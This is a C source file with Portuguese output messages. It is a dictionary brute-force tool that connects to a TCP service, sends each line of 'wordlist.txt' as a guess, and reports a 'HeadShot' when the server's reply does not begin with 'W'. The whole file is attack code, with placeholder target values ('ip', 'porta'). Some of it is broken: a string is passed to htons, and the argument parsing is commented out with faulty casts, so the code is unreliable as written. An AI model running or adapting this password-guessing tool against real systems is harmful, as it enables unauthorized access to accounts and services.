#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <fcntl.h>
	int disparo(){
		
   	int conn,tbuf;
   	char buffer[1024];
   	struct sockaddr_in sock;
   
   	conn = socket(AF_INET, SOCK_STREAM, 0);
   	sock.sin_family = AF_INET;
   	sock.sin_addr.s_addr = inet_addr("ip");
   	sock.sin_port = htons("porta");
   
   	memset(&(sock.sin_zero), 0x00, sizeof(sock.sin_zero));
   	if(connect(conn, (struct sockaddr *)&sock, sizeof(struct sockaddr)) != 0){
			puts("\n >>Servidor nao encontrado<<\n");
			exit(0);
   	}
	   
   
  		printf("\n>>Conexao estabelecida<<\n");
  		tbuf = recv(conn,buffer,1024,0);
  		buffer[tbuf] = 0x00;
  		printf("\n->:%s",buffer);
  		memset(&buffer,0x00,sizeof(buffer));	  

  		FILE *arq;
  		char Linha[100];
  		char *result;
  		int i;

  		arq = fopen("wordlist.txt", "rt");

  		if (arq == NULL)  
  		{
     		printf("Problemas na abertura do arquivo\n");
     		return;
  		}

  		i = 1;
  		while (!feof(arq))
  		{
	   	result = fgets(Linha, 100, arq);  
      	if (result)  {
			  send(conn, Linha, strlen(Linha), 0 );			  
			  memset(&buffer,0x00,sizeof(buffer));
			  tbuf = recv(conn,buffer,1024,0);
  			  buffer[tbuf] = 0x00;
  			   			  
				if(buffer[0] != 'W') {
					printf("HeadShot %d : %s",i,Linha);
					exit(1);			
				}  			  
  			  
			  i++;
      }
  }
  printf("Voce vai precisar recarregar!");
  fclose(arq);
  
  close(conn);


}
int main(int argc, char **argv){
	disparo();
	/*
	int *port;
	char *adress;
	
	for(int i = 1;i<argc; i++) {
		
		
		if(strcmp(argv[i],"-a") == 0) {
			adress = argv[i+1];		
		}
		
		if(strcmp(argv[i],"-p") == 0) {
			port =(int *)& argv[i+1];		
		}
		
			
	}
	
	printf("Alvo: %s\n",adress);
	printf("Porta: %d\n",port);
	//disparo(adress,port);*/
	   
   return 0;
}

